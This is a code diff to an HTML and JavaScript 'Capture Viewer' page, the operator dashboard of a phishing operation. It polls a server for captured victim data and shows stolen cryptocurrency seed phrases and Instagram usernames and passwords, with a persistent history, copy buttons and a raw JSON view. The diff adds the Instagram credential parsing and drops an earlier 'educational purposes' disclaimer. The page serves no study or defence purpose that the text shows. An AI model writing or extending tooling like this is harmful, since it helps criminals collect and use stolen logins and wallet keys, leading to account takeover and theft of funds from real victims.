@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Captured Phrase Viewer</title>
+<title>Capture Viewer — All Data</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
@@ -23,16 +23,9 @@
     max-width: 100%;
     box-shadow: 0 20px 60px rgba(0,0,0,0.6);
   }
-  h1 {
-    color: #fff;
-    font-size: 22px;
-    margin-bottom: 4px;
-  }
-  .subtitle {
-    color: #7b7d9a;
-    font-size: 14px;
-    margin-bottom: 24px;
-  }
+  h1 { color: #fff; font-size: 22px; margin-bottom: 4px; }
+  .subtitle { color: #7b7d9a; font-size: 14px; margin-bottom: 24px; }
+
   .status {
     display: inline-flex;
     align-items: center;
@@ -43,33 +36,42 @@
     font-weight: 500;
     margin-bottom: 20px;
   }
-  .status.waiting {
-    background: rgba(255, 193, 7, 0.12);
-    color: #ffc107;
-  }
-  .status.captured {
-    background: rgba(76, 217, 100, 0.12);
-    color: #4cd964;
-  }
-  .dot {
-    width: 8px; height: 8px;
-    border-radius: 50%;
-    display: inline-block;
-  }
+  .status.waiting { background: rgba(255,193,7,0.12); color: #ffc107; }
+  .status.captured { background: rgba(76,217,100,0.12); color: #4cd964; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
   .dot.waiting { background: #ffc107; animation: pulse 1.5s ease-in-out infinite; }
   .dot.captured { background: #4cd964; }
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.4; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+  .tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
   }
-  
+  .tab {
+    padding: 8px 16px;
+    border-radius: 8px;
+    background: #262841;
+    color: #7b7d9a;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    border: none;
+    transition: all 0.2s;
+  }
+  .tab.active {
+    background: #3772ff;
+    color: #fff;
+  }
+  .tab:hover:not(.active) { color: #b0b2d3; }
+
   .latest-box {
     background: #0d0e1a;
     border: 1px solid #3772ff;
     border-radius: 12px;
     padding: 20px;
     font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
-    font-size: 16px;
+    font-size: 15px;
     color: #e0e0e0;
     line-height: 1.7;
     word-break: break-all;
@@ -77,193 +79,294 @@
     user-select: all;
     margin-bottom: 24px;
   }
-  .latest-box .empty {
-    color: #5a5c7e;
-    font-style: italic;
-    font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+  .latest-box .empty { color: #5a5c7e; font-style: italic; }
+
+  .cred-display {
+    display: grid;
+    grid-template-columns: auto 1fr;
+    gap: 8px 16px;
+    align-items: center;
   }
-  .latest-label {
-    color: #3772ff;
+  .cred-label {
+    color: #7b7d9a;
     font-size: 12px;
-    font-weight: 600;
     text-transform: uppercase;
     letter-spacing: 0.5px;
-    margin-bottom: 8px;
   }
-  
-  .history-section h3 {
-    color: #7b7d9a;
+  .cred-value {
+    color: #e0e0e0;
+    background: #15162a;
+    padding: 8px 12px;
+    border-radius: 6px;
+    font-family: 'SFMono-Regular', Consolas, monospace;
     font-size: 14px;
-    font-weight: 500;
-    margin-bottom: 12px;
+    user-select: all;
   }
+  .cred-value.highlight {
+    color: #ff6b6b;
+    font-weight: 600;
+  }
+
+  .raw-toggle {
+    color: #5a5c7e;
+    font-size: 12px;
+    cursor: pointer;
+    margin-bottom: 8px;
+    display: inline-block;
+  }
+  .raw-toggle:hover { color: #b0b2d3; }
+
+  .history-section h3 { color: #7b7d9a; font-size: 14px; font-weight: 500; margin-bottom: 12px; }
   .history-entry {
     display: flex;
     gap: 12px;
     padding: 10px 14px;
     border-radius: 8px;
     background: #15162a;
-    margin-bottom: 8px;
+    margin-bottom: 6px;
     align-items: flex-start;
-  }
-  .entry-time {
-    color: #5a5c7e;
-    font-size: 12px;
-    white-space: nowrap;
-    min-width: 140px;
-    padding-top: 2px;
-  }
-  .entry-phrase {
-    color: #b0b2d3;
-    font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
-    font-size: 14px;
-    word-break: break-all;
-    line-height: 1.5;
-    flex: 1;
-  }
-  .no-history {
-    color: #5a5c7e;
-    font-style: italic;
-    font-size: 13px;
-  }
-  
-  .btn-group {
-    display: flex;
-    gap: 8px;
-    margin-top: 20px;
-  }
-  .btn {
-    padding: 10px 20px;
-    border: none;
-    border-radius: 8px;
-    font-size: 14px;
-    font-weight: 600;
     cursor: pointer;
-    transition: all 0.2s;
+    transition: background 0.15s;
   }
-  .btn-refresh {
-    background: #3772ff;
-    color: #fff;
+  .history-entry:hover { background: #1a1b30; }
+  .history-entry.selected { border-left: 3px solid #3772ff; }
+  .entry-time { color: #5a5c7e; font-size: 11px; white-space: nowrap; min-width: 130px; padding-top: 3px; }
+  .entry-summary { color: #b0b2d3; font-size: 13px; word-break: break-all; flex: 1; }
+  .entry-type {
+    font-size: 10px;
+    font-weight: 600;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border-radius: 10px;
+    white-space: nowrap;
   }
+  .type-phrase { background: rgba(55,114,255,0.15); color: #3772ff; }
+  .type-instagram { background: rgba(255,107,107,0.15); color: #ff6b6b; }
+  .type-unknown { background: rgba(123,92,221,0.15); color: #7b5cdd; }
+
+  .btn-group { display: flex; gap: 8px; margin-top: 16px; }
+  .btn {
+    padding: 10px 20px; border: none; border-radius: 8px;
+    font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+  }
+  .btn-refresh { background: #3772ff; color: #fff; }
   .btn-refresh:hover { background: #2a5ee6; }
-  .btn-copy {
-    background: #262841;
-    color: #b0b2d3;
-    border: 1px solid #2e3058;
-  }
+  .btn-copy { background: #262841; color: #b0b2d3; border: 1px solid #2e3058; }
   .btn-copy:hover { background: #2e3058; color: #fff; }
-  .btn-clear {
-    background: none;
-    color: #ff6b6b;
-    border: 1px solid rgba(255,107,107,0.3);
-    margin-left: auto;
-  }
+  .btn-clear { background: none; color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); margin-left: auto; }
   .btn-clear:hover { background: rgba(255,107,107,0.1); }
-  
-  .meta-info {
-    color: #5a5c7e;
-    font-size: 12px;
-    text-align: center;
-    margin-top: 16px;
-  }
+
+  .hidden { display: none; }
 </style>
 </head>
 <body>
 <div class="container">
-  <h1>🔑 Captured Phrase Viewer</h1>
-  <h1>🔑 Strictly for Educational Purposes only</h1>
-  <p class="subtitle">Persistent log — you can check anytime, even after PA leaves</p>
-   <p class="subtitle">Report to @ajepakobutty if you see anything suspicious</p>
+  <h1>🔑 Capture Viewer</h1>
+  <p class="subtitle">Shows seed phrases AND Instagram credentials from the same server</p>
 
   <div class="status waiting" id="statusBadge">
     <span class="dot waiting" id="statusDot"></span>
-    <span id="statusText">Waiting for PA...</span>
+    <span id="statusText">Waiting for data...</span>
   </div>
 
-  <div class="latest-label">Latest Captured Phrase</div>
-  <div class="latest-box" id="latestBox">
-    <span class="empty">No phrase captured yet</span>
+  <div class="tabs">
+    <button class="tab active" data-view="parsed">Parsed View</button>
+    <button class="tab" data-view="raw">Raw JSON</button>
   </div>
 
-  <div class="history-section">
-    <h3>📜 Full Capture History</h3>
-    <div id="historyContainer">
-      <span class="no-history">No entries yet</span>
+  <!-- Parsed View -->
+  <div id="view-parsed">
+    <div class="latest-box" id="latestBox">
+      <span class="empty">No data captured yet</span>
+    </div>
+  </div>
+
+  <!-- Raw View -->
+  <div id="view-raw" class="hidden">
+    <div class="latest-box" id="rawBox" style="font-size:13px;">
+      <span class="empty">No raw data</span>
     </div>
   </div>
 
   <div class="btn-group">
-    <button class="btn btn-copy" id="copyBtn">📋 Copy Latest</button>
+    <button class="btn btn-copy" id="copyBtn">📋 Copy</button>
     <button class="btn btn-refresh" id="refreshBtn">🔄 Refresh</button>
     <button class="btn btn-clear" id="clearBtn">🗑️ Clear Log</button>
   </div>
 
-  <div class="meta-info" id="metaInfo">Last checked: --</div>
+  <div class="history-section" style="margin-top:20px;">
+    <h3>📜 Full History</h3>
+    <div id="historyContainer">
+      <span class="no-history" style="color:#5a5c7e;font-style:italic;font-size:13px;">No entries yet</span>
+    </div>
+  </div>
+
+  <div class="meta-info" style="color:#5a5c7e;font-size:12px;text-align:center;margin-top:16px;" id="metaInfo">
+    Last checked: --
+  </div>
 </div>
 
 <script>
+  const SERVER_URL = '/api/capture';
+  const LOG_URL    = '/api/log';
+
+  let currentData = null;
+  let selectedIndex = -1;
+
+  function detectType(data) {
+    if (!data || !data.phrase) return 'unknown';
+    try {
+      const parsed = JSON.parse(data.phrase);
+      if (parsed.username !== undefined || parsed.password !== undefined) return 'instagram';
+    } catch(e) {}
+    return 'phrase';
+  }
+
+  function formatEntry(data) {
+    const type = detectType(data);
+    if (type === 'instagram') {
+      try {
+        const p = JSON.parse(data.phrase);
+        return `
+          <div class="cred-display">
+            <span class="cred-label">Username</span>
+            <span class="cred-value highlight">${escapeHtml(p.username || '(empty)')}</span>
+            <span class="cred-label">Password</span>
+            <span class="cred-value highlight">${escapeHtml(p.password || '(empty)')}</span>
+            <span class="cred-label">Time</span>
+            <span class="cred-value">${new Date(data.timestamp).toLocaleString()}</span>
+            <span class="cred-label">Source</span>
+            <span class="cred-value"><span class="entry-type type-instagram">Instagram</span></span>
+          </div>
+        `;
+      } catch(e) {
+        return `<div class="cred-value">${escapeHtml(data.phrase)}</div>`;
+      }
+    } else {
+      return `
+        <div style="margin-bottom:6px;">
+          <span class="entry-type type-phrase" style="display:inline-block;margin-bottom:8px;">Seed Phrase</span>
+        </div>
+        <div class="cred-value">${escapeHtml(data.phrase)}</div>
+      `;
+    }
+  }
+
+  function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+  }
+
+  function getSummary(phrase) {
+    try {
+      const p = JSON.parse(phrase);
+      if (p.username) return `${p.username} / ${p.password || '(no pw)'}`;
+    } catch(e) {}
+    const words = phrase.split(/\s+/);
+    if (words.length >= 12) return words.slice(0,4).join(' ') + '... (' + words.length + ' words)';
+    return phrase.substring(0, 60) + (phrase.length > 60 ? '...' : '');
+  }
+
   async function fetchData() {
     try {
-      // Get latest
       const [latestRes, logRes] = await Promise.all([
-        fetch('/api/capture'),
-        fetch('/api/log')
+        fetch(SERVER_URL),
+        fetch(LOG_URL)
       ]);
-      
       const latest = await latestRes.json();
-      const log = await logRes.json();
-      
-      // Update latest
-      const latestBox = document.getElementById('latestBox');
+      const log    = await logRes.json();
+
+      currentData = latest;
+
       const statusBadge = document.getElementById('statusBadge');
-      const statusDot = document.getElementById('statusDot');
-      const statusText = document.getElementById('statusText');
-      
+      const statusDot   = document.getElementById('statusDot');
+      const statusText  = document.getElementById('statusText');
+      const latestBox   = document.getElementById('latestBox');
+      const rawBox      = document.getElementById('rawBox');
+      const historyC    = document.getElementById('historyContainer');
+
+      // Update latest
       if (latest.phrase && latest.phrase.trim().length > 0) {
-        latestBox.innerHTML = '';
-        latestBox.textContent = latest.phrase;
-        
+        latestBox.innerHTML = formatEntry(latest);
+        rawBox.textContent = JSON.stringify(JSON.parse(latest.phrase), null, 2);
+
         statusBadge.className = 'status captured';
         statusDot.className = 'dot captured';
-        statusText.textContent = '✅ Phrase captured!';
+        statusText.textContent = '✅ Data captured!';
       } else {
-        latestBox.innerHTML = '<span class="empty">No phrase captured yet</span>';
+        latestBox.innerHTML = '<span class="empty">No data captured yet</span>';
+        rawBox.innerHTML = '<span class="empty">No raw data</span>';
         statusBadge.className = 'status waiting';
         statusDot.className = 'dot waiting';
-        statusText.textContent = 'Waiting for PA...';
+        statusText.textContent = 'Waiting for data...';
       }
-      
+
       // Update history
-      const historyContainer = document.getElementById('historyContainer');
       if (log.entries && log.entries.length > 0) {
-        historyContainer.innerHTML = log.entries.slice().reverse().map(entry => `
-          <div class="history-entry">
-            <span class="entry-time">${new Date(entry.timestamp).toLocaleString()}</span>
-            <span class="entry-phrase">${entry.phrase}</span>
-          </div>
-        `).join('');
+        historyC.innerHTML = log.entries.slice().reverse().map((entry, i) => {
+          const type = detectType(entry);
+          const typeClass = type === 'instagram' ? 'type-instagram' : type === 'phrase' ? 'type-phrase' : 'type-unknown';
+          const typeLabel = type === 'instagram' ? 'Instagram' : type === 'phrase' ? 'Phrase' : 'Unknown';
+          return `
+            <div class="history-entry ${i === selectedIndex ? 'selected' : ''}" data-index="${i}">
+              <span class="entry-time">${new Date(entry.timestamp).toLocaleString()}</span>
+              <span class="entry-summary">${escapeHtml(getSummary(entry.phrase))}</span>
+              <span class="entry-type ${typeClass}">${typeLabel}</span>
+            </div>
+          `;
+        }).join('');
+
+        // Click to select
+        document.querySelectorAll('.history-entry').forEach(el => {
+          el.addEventListener('click', function() {
+            document.querySelectorAll('.history-entry').forEach(e => e.classList.remove('selected'));
+            this.classList.add('selected');
+            const idx = parseInt(this.dataset.index);
+            const entry = log.entries.slice().reverse()[idx];
+            if (entry) {
+              currentData = entry;
+              document.getElementById('latestBox').innerHTML = formatEntry(entry);
+              try {
+                document.getElementById('rawBox').textContent = JSON.stringify(JSON.parse(entry.phrase), null, 2);
+              } catch(e) {
+                document.getElementById('rawBox').textContent = entry.phrase;
+              }
+            }
+          });
+        });
       } else {
-        historyContainer.innerHTML = '<span class="no-history">No entries yet</span>';
+        historyC.innerHTML = '<span style="color:#5a5c7e;font-style:italic;font-size:13px;">No entries yet</span>';
       }
-      
+
       document.getElementById('metaInfo').textContent = `Last checked: ${new Date().toLocaleString()}`;
-    } catch (err) {
+    } catch(err) {
       document.getElementById('latestBox').innerHTML = '<span class="empty">Error connecting to server</span>';
     }
   }
 
+  // ── Tab switching ──
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', function() {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      this.classList.add('active');
+      const view = this.dataset.view;
+      document.getElementById('view-parsed').classList.toggle('hidden', view !== 'parsed');
+      document.getElementById('view-raw').classList.toggle('hidden', view !== 'raw');
+    });
+  });
+
   document.getElementById('copyBtn').addEventListener('click', () => {
     const text = document.getElementById('latestBox').textContent;
-    if (!text || text.includes('No phrase')) return;
+    if (!text || text.includes('No data')) return;
     navigator.clipboard.writeText(text).then(() => {
-      const btn = document.getElementById('copyBtn');
-      btn.textContent = '✅ Copied!';
-      setTimeout(() => btn.textContent = '📋 Copy Latest', 2000);
+      document.getElementById('copyBtn').textContent = '✅ Copied!';
+      setTimeout(() => document.getElementById('copyBtn').textContent = '📋 Copy', 2000);
     });
   });
 
   document.getElementById('refreshBtn').addEventListener('click', fetchData);
-  
+
   document.getElementById('clearBtn').addEventListener('click', async () => {
     if (confirm('Clear the log file on the server?')) {
       await fetch('/api/clear-log', { method: 'POST' });
@@ -271,9 +374,7 @@
     }
   });
 
-  // Auto refresh every 5 seconds
-  setInterval(fetchData, 5000);
-  
+  setInterval(fetchData, 3000);
   fetchData();
 </script>
 </body>
